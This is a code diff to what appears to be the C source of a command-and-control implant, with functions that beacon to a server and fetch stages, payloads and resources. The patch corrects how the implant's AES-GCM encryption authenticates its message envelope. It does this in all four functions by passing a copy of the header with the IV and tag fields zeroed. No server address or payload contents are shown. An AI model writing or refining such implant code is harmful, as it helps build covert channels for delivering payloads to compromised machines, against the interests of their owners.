@@ -685,9 +685,14 @@ aegis_result_t aegis_c2_beacon(aegis_c2_ctx_t *ctx, uint8_t *task_out,
 
   env.payload_len = (uint32_t)fp_len;
 
+  aegis_c2_envelope_t aad_env_b;
+  memcpy(&aad_env_b, &env, sizeof(env));
+  memset(aad_env_b.iv, 0, AEGIS_GCM_IV_BYTES);
+  memset(aad_env_b.tag, 0, AEGIS_GCM_TAG_BYTES);
+
   aegis_result_t rc =
-      aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&env,
-                    sizeof(env), ct_buf, env.iv, env.tag);
+      aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&aad_env_b,
+                    sizeof(aad_env_b), ct_buf, env.iv, env.tag);
   if (rc != AEGIS_OK) {
     ctx->consecutive_failures++;
     return rc;
@@ -846,9 +851,14 @@ aegis_result_t aegis_c2_fetch_stage(aegis_c2_ctx_t *ctx, uint8_t **stage_out,
   uint8_t ct_buf[1024];
   env.payload_len = (uint32_t)fp_len;
 
+  aegis_c2_envelope_t aad_env_b;
+  memcpy(&aad_env_b, &env, sizeof(env));
+  memset(aad_env_b.iv, 0, AEGIS_GCM_IV_BYTES);
+  memset(aad_env_b.tag, 0, AEGIS_GCM_TAG_BYTES);
+
   aegis_result_t rc =
-      aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&env,
-                    sizeof(env), ct_buf, env.iv, env.tag);
+      aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&aad_env_b,
+                    sizeof(aad_env_b), ct_buf, env.iv, env.tag);
   AEGIS_ZERO(fp_buf, sizeof(fp_buf));
   if (rc != AEGIS_OK)
     return rc;
@@ -1005,8 +1015,13 @@ aegis_result_t aegis_c2_fetch_payload(aegis_c2_ctx_t *ctx,
   uint8_t ct_buf[256];
   env.payload_len = (uint32_t)req_len;
 
+  aegis_c2_envelope_t aad_env_p;
+  memcpy(&aad_env_p, &env, sizeof(env));
+  memset(aad_env_p.iv, 0, AEGIS_GCM_IV_BYTES);
+  memset(aad_env_p.tag, 0, AEGIS_GCM_TAG_BYTES);
+
   aegis_result_t rc = aegis_encrypt(ctx->crypto, (const uint8_t *)req_body,
-                                    req_len, (const uint8_t *)&env, sizeof(env),
+                                    req_len, (const uint8_t *)&aad_env_p, sizeof(aad_env_p),
                                     ct_buf, env.iv, env.tag);
   if (rc != AEGIS_OK)
     return rc;
@@ -1220,8 +1235,13 @@ aegis_result_t aegis_c2_fetch_resource(aegis_c2_ctx_t *ctx,
 
   env.payload_len = (uint32_t)id_len;
 
+  aegis_c2_envelope_t aad_env_r;
+  memcpy(&aad_env_r, &env, sizeof(env));
+  memset(aad_env_r.iv, 0, AEGIS_GCM_IV_BYTES);
+  memset(aad_env_r.tag, 0, AEGIS_GCM_TAG_BYTES);
+
   aegis_result_t rc = aegis_encrypt(ctx->crypto, (const uint8_t *)resource_id,
-                                    id_len, (const uint8_t *)&env, sizeof(env),
+                                    id_len, (const uint8_t *)&aad_env_r, sizeof(aad_env_r),
                                     ct_buf, env.iv, env.tag);
   if (rc != AEGIS_OK)
     return rc;
